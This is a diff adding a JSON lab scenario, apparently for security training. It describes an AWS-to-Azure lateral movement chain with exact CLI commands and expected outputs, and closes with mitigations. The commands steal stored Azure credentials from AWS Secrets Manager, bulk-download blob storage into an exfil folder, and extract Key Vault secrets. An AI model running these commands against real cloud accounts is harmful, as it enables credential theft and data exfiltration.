@@ -1,0 +1,22 @@
+{
+  "title": "Multi-Cloud Compromise: AWS to Azure Lateral Movement",
+  "description": "Cross-cloud attack demonstrating lateral movement from AWS to Azure infrastructure",
+  "difficulty": "expert",
+  "estimated_time": "120 minutes",
+  "tools_used": ["aws-cli", "az-cli", "pacu", "stormspotter"],
+  "attack_chain": [
+    {"step": 1, "title": "AWS Initial Access", "command": "aws sts get-caller-identity", "explanation": "Verify compromised AWS credentials", "expected_output": "User: developer, Account: 123456789012", "success_criteria": "AWS access confirmed"},
+    {"step": 2, "title": "Secrets Manager Discovery", "command": "aws secretsmanager list-secrets", "explanation": "Enumerate AWS Secrets Manager for stored credentials", "expected_output": "azure/service-principal, prod/database/master", "success_criteria": "Azure credentials found"},
+    {"step": 3, "title": "Azure Credential Extraction", "command": "aws secretsmanager get-secret-value --secret-id azure/service-principal", "explanation": "Retrieve Azure service principal credentials", "expected_output": "tenant_id, client_id, client_secret for Azure", "success_criteria": "Azure credentials obtained"},
+    {"step": 4, "title": "Azure Authentication", "command": "az login --service-principal -u CLIENT_ID -p CLIENT_SECRET --tenant TENANT_ID", "explanation": "Authenticate to Azure using stolen service principal", "expected_output": "Successfully authenticated to Azure subscription", "success_criteria": "Azure access established"},
+    {"step": 5, "title": "Azure Subscription Enumeration", "command": "az account list", "explanation": "List all accessible Azure subscriptions", "expected_output": "Production, Development, Staging subscriptions", "success_criteria": "3 subscriptions discovered"},
+    {"step": 6, "title": "Azure VM Enumeration", "command": "az vm list --output table", "explanation": "Discover Azure virtual machines", "expected_output": "prod-web-vm, db-server-primary, 8 VMs total", "success_criteria": "VMs mapped"},
+    {"step": 7, "title": "Storage Account Discovery", "command": "az storage account list", "explanation": "Enumerate Azure storage accounts", "expected_output": "prodstorageacct, backupstorage", "success_criteria": "Storage accounts found"},
+    {"step": 8, "title": "Blob Storage Exfiltration", "command": "az storage blob download-batch -d ./exfil/ -s container-name --account-name prodstorageacct", "explanation": "Download data from Azure blob storage", "expected_output": "1,234 files downloaded (3.2GB)", "success_criteria": "Data exfiltrated"},
+    {"step": 9, "title": "Key Vault Enumeration", "command": "az keyvault list", "explanation": "Discover Azure Key Vaults with secrets", "expected_output": "prod-keyvault, dev-secrets-vault", "success_criteria": "Key Vaults found"},
+    {"step": 10, "title": "Key Vault Secret Extraction", "command": "az keyvault secret list --vault-name prod-keyvault && az keyvault secret show --vault-name prod-keyvault --name database-password", "explanation": "Extract secrets from Key Vault", "expected_output": "database-password: ProdDB$2024!, api-key: sk_live_...", "success_criteria": "Secrets obtained"}
+  ],
+  "learning_objectives": ["Cross-cloud lateral movement", "AWS Secrets Manager exploitation", "Azure service principal abuse", "Multi-cloud reconnaissance", "Azure Key Vault access"],
+  "mitigation": ["Separate cloud credentials", "Use managed identities", "Implement least privilege", "Enable cloud audit logs", "Network boundaries between clouds"],
+  "tags": ["aws", "azure", "multi-cloud", "lateral_movement", "secrets_manager"]
+}
